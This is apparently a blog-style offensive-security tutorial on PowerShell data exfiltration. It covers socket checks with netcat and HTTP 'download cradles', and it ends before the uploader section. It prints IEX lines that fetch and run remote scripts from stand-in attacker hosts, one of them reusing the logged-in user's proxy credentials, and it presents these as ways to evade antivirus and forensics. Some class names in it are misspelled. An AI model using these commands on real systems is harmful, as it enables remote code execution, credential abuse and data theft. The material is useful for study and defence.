# Powershell for data exfil!

Powershell functions as a great tool for windows machines. Both PS and .net primitives are installed on every windows machine, and while you can use VBS or wscript to perform exfil, they come with a higher chance for detection. Powershell is a solid framework to perform in and we'll cover some usage and options here.

While there are multiple ways to exfiltrate data, there are a a few really common methods.

- Raw sockets
- HTTP/HTTPS
- Mail(SMTP)
- Other protocols(VoIP, QUIC, e.g.)

### Raw Sockets

The easiest way to see if a particular port is open, and permitting communications is the Test-NetConnection cmdlet, like so:
~~~
PS> Test-NetConnection -port 5555 10.0.2.2

ComputerName           : 10.0.2.2
RemoteAddress          : 10.0.2.2
RemotePort             : 5555
InterfaceAlias         : Ethernet
SourceAddress          : 10.0.2.15
PingSucceeded          : True
PingReplyDetails (RTT) : 0 ms
TcpTestSucceeded       : False
~~~
We can see that while our target device is online(via PingSucceeded) our port is closed, (via TcpTestSucceeded).

Using NC(a network tool) I open up an nc listener in order to see the connection, run the same command and see the output

My host machine, listening with verbose results:
~~~
┌─[ganymede@parrot]─[~]
└──╼ $nc -lvp 5555
listening on [any] 5555 ...
~~~

The Windows10 VM:
~~~
PS> Test-NetConnection -port 5555 10.0.2.2

ComputerName           : 10.0.2.2
RemoteAddress          : 10.0.2.2
RemotePort             : 5555
InterfaceAlias         : Ethernet
SourceAddress          : 10.0.2.15
TcpTestSucceeded       : True
~~~
My host machine see's the connection
~~~
┌─[ganymede@parrot]─[~]
└──╼ $nc -lvp 5555
listening on [any] 5555 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 57950
~~~

We can go even further and transfer files, which I'll get into in a moment, first we should talk about the reason we can do this. Powershell makes use of .net primitives, and within the system.net namespace we have sockets, allowing us to open up sockets, allowing us to transfer data. Which we can see an example of utilized below:
~~~
$FuncVarS["Socket"] = New-Object System.Net.Sockets.UDPClient $P
$PacketInfo = New-Object System.Net.Sockets.IPPacketInformation
~~~
Because these all exist within the systems network namespace, the idea is that they are all part of the OS, and it won't trip AV for that reason.

### HTTP/HTTPS 

Many techniques are portable from http to https, and in the early days, protocols like irc would be used for command and control. Modern attackers are dodging port protocol mismatches and odd traffic issues using http, because in many organization you can surf the web with no issues. While an admin might make the counter argument of "We have a web proxy to handle requests." it's not an issue for an attacker. We can actually have PoC here:
~~~
$wc = New-Object System.Net.Web.Client
$wc.Proxy = [System.Net.WebRequests]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
IEX $wc.DownloadString("https://s3bucket.amazonaws.com/malicious.ps1")
~~~

In this instance we are taking the logged in user's credentials and using the proxy, not just bypassing it, using it, which is great! We look like a normal web user and unless we're under scrutiny, we look like a normal user. When we use powershell (or any language) to download a file, it's called a "download cradle"

Typical download cradles look like this:
~~~
IEX (New-Object Net.WebClient).downloadstring("http://evil.file.com/pwnagestego.png")
~~~
"System"  it's still invoked it just doesn't need to fully  be named. IEX is actually short for invoke expression and will actually launch the PS code, directly into memory, without touching the disk, bypassing execution restriction policies, and even throwing disk based forensics off. Kepe in mind, there are definitely more download cradles, this is just one example.

Just as we can create a downloader, we can create an uploader as well.

